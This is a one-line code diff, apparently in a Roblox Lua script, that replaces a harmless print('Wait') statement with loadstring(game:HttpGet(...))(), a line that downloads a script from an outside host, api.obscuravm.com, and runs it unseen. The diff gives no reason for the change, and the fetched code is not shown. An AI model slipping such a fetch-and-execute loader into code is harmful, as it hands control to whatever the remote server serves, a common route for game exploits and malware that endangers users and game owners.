@@ -1,1 +1,1 @@
-print("Wait")
+loadstring(game:HttpGet("https://api.obscuravm.com/scripts/1361548874793648527"))()
